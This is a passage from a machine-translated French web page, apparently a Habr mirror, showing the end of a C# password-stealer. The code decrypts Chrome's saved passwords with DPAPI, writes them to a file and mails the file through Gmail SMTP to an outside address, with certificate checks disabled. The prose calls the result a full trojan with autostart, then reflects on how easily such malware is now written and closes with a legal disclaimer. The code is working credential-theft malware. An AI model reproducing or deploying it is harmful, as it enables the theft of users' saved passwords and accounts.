            using (SQLiteConnection connect = <span class="hljs-keyword">new</span> SQLiteConnection(ConnectionString))<font></font>
            {<font></font>
                SQLiteCommand command = <span class="hljs-keyword">new</span> SQLiteCommand(sql, connect);<font></font>
                SQLiteDataAdapter adapter = <span class="hljs-keyword">new</span> SQLiteDataAdapter(command);<font></font>
                adapter.Fill(DB);<font></font>
                <span class="hljs-keyword">int</span> rows = DB.Rows.Count;<font></font>
<font></font>
                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; rows; i++)<font></font>
                {<font></font>
                    Writer.Write(i + <span class="hljs-number">1</span> + <span class="hljs-string">") "</span>); <span class="hljs-comment">//        "--". </span>
                    Writer.WriteLine(DB.Rows[i][<span class="hljs-number">1</span>] + <span class="hljs-string">"&lt;br&gt;"</span>); <span class="hljs-comment">//   </span>
                    Writer.WriteLine(DB.Rows[i][<span class="hljs-number">3</span>] + <span class="hljs-string">"&lt;br&gt;"</span>); <span class="hljs-comment">// </span>
                                                              <span class="hljs-comment">//    </span>
                    <span class="hljs-keyword">byte</span>[] byteArray = (<span class="hljs-keyword">byte</span>[])DB.Rows[i][<span class="hljs-number">5</span>];
                    <span class="hljs-keyword">byte</span>[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);<font></font>
                    string password = <span class="hljs-keyword">new</span> UTF8Encoding(<span class="hljs-keyword">true</span>).GetString(decrypted);<font></font>
                    Writer.WriteLine(password + <span class="hljs-string">"&lt;br&gt;&lt;br&gt;"</span>);<font></font>
                }<font></font>
<font></font>
            }<font></font>
<font></font>
            Writer.Close();<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span><font></font>
        {   }<font></font>
    }<font></font>
<font></font>
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Send</span><span class="hljs-params">()</span>
    </span>{<font></font>
        MailAddress from = <span class="hljs-keyword">new</span> MailAddress(<span class="hljs-string">"l**************d@gmail.com"</span>, <span class="hljs-string">"Passwords"</span>);<font></font>
        MailAddress to = <span class="hljs-keyword">new</span> MailAddress(<span class="hljs-string">"a***********v@yandex.ru"</span>);<font></font>
        MailMessage m = <span class="hljs-keyword">new</span> MailMessage(from, to);<font></font>
        m.Subject = (DateTime.Now).ToString();<font></font>
        m.Body = <span class="hljs-string">""</span>;<font></font>
        m.IsBodyHtml = <span class="hljs-keyword">true</span>;<font></font>
        SmtpClient smtp = <span class="hljs-keyword">new</span> SmtpClient(<span class="hljs-string">"smtp.gmail.com"</span>, <span class="hljs-number">587</span>); ;<font></font>
        smtp.Credentials = <span class="hljs-keyword">new</span> NetworkCredential(<span class="hljs-string">"l*****************d@gmail.com"</span>, <span class="hljs-string">"q********l"</span>);<font></font>
        smtp.EnableSsl = <span class="hljs-keyword">true</span>;<font></font>
        ServicePointManager.ServerCertificateValidationCallback = delegate { <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>; };<font></font>
        m.Attachments.Add(<span class="hljs-keyword">new</span> Attachment(filename));
        <span class="hljs-keyword">try</span><font></font>
        {<font></font>
            smtp.Send(m);<font></font>
        }<font></font>
        <span class="hljs-keyword">catch</span> { }<font></font>
    }<font></font>
<font></font>
<font></font>
}</code></pre><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La plupart du code pour décrypter le mot de passe provient de l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">article</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> correspondant </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;">sur le stockage des mots de passe dans Chrome</font></a><font style="vertical-align: inherit;"> , qui, en fait, est facile à google et à être dans le domaine public. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout ce qui resterait pour transformer ce produit logiciel en cheval de Troie est d'ajouter la possibilité d '«infecter» un ordinateur avec lui à l'insu de l'utilisateur, d'ajouter une condition de déclenchement et d'apprendre à envoyer des informations volées à un serveur distant.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En conséquence, dans l'ensemble, chacune des étapes est bien suivie. Dans la fonction Registr, le programme se copie dans le dossier de service et entre en exécution automatique au démarrage du système d'exploitation, dans le bloc Generate il génère un fichier avec des mots de passe et des connexions, tout est un peu déroutant, mais la plupart du code utilisé ici est copié à partir de sources ouvertes. Le code est commenté en place, ici je ne vois aucune raison de le répéter. Et enfin, la fonction Envoyer envoie le fichier de mot de passe au courrier spécifié. Le code ne nécessite pas non plus de connaissances approfondies des sockets et de la pile TCP / IP - dans .NET, tout est assez bien emballé dans une classe de haut niveau pour travailler avec le courrier. Si nécessaire, vous pouvez transférer des données vers n'importe quel protocole, y compris les requêtes POST et le serveur FTP, mais cela ne devrait pas augmenter le serveur - vous pouvez utiliser le courrier.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En conséquence, après une demi-heure de travail avec le code, nous avons obtenu un cheval de Troie à part entière, qui, bien sûr, est détecté par les antivirus, mais si vous n'en tenez pas compte, cela fonctionne parfaitement correctement. Et à un moment donné, l'écriture d'un tel programme a nécessité plusieurs centaines de lignes de code. Maintenant, cela prenait quelques dizaines de minutes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Est-ce bon ou mauvais? La question est très ouverte, car d'une part, une diminution du niveau d'entrée dans la profession augmente l'afflux de personnel, récemment il est devenu plus facile d'écrire un programme de travail, respectivement, il y a eu plus de programmes, et dans une économie de marché c'est certainement bon, car la concurrence améliore la qualité. D'un autre côté, un seuil d'entrée bas signifie un grand nombre de personnel peu ou moyennement qualifié, à cause de quoi la qualité des produits logiciels reste inférieure à celle souhaitée, même en tenant compte de tous les outils qui facilitent le travail du développeur - langages de programmation de haut niveau modernes, environnements de développement intégrés, débogueurs, etc. .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eh bien, bien sûr - puisqu'il y a plus de produits logiciels, il y a plus de virus. </font><font style="vertical-align: inherit;">Bien sûr, un utilisateur soigné et attentif sait généralement comment les éviter - il ne suit pas les liens des lettres et n'insère pas de lecteurs flash non vérifiés. </font><font style="vertical-align: inherit;">Mais le fait demeure - maintenant, quand chaque élève du secondaire sait comment écrire un virus de base - les antivirus sont devenus plus populaires qu'il y a quelques décennies. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">L'auteur ne recommande aucunement la création de logiciels malveillants et rappelle que l'accès illégal à des informations privées est poursuivi.</font></font></i></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr493928/index.html">Examen et test du Huawei Dorado 5000V6</a></li>
<li><a href="../fr493932/index.html">Présentation des enquêtes Google. Pourquoi il ne convient pas pour une recherche sérieuse</a></li>
<li><a href="../fr493934/index.html">Qui, comment et sur quoi ont exploré les océans du monde - nous analysons les bases de la NOAA</a></li>
<li><a href="../fr493938/index.html">Comment réduire les coûts dans AWS</a></li>
<li><a href="../fr493940/index.html">Protocole de traitement du coronavirus naturel 2019-nCoV</a></li>
<li><a href="../fr493944/index.html">Nous continuons d'analyser les vulnérabilités des commutateurs industriels: nous exécutons du code arbitraire sans mot de passe</a></li>
<li><a href="../fr493948/index.html">Comment j'ai fabriqué un respirateur KN95 à la maison à partir de matériaux improvisés. des instructions détaillées</a></li>
<li><a href="../fr493950/index.html">Calculateur de réseau neuronal pour additionner et soustraire des nombres pas très grands</a></li>
<li><a href="../fr493952/index.html">Comment évaluer l'intelligence? Approche Google</a></li>
<li><a href="../fr493954/index.html">PostgreSQL Ajouter des contraintes non nulles aux grandes tables</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>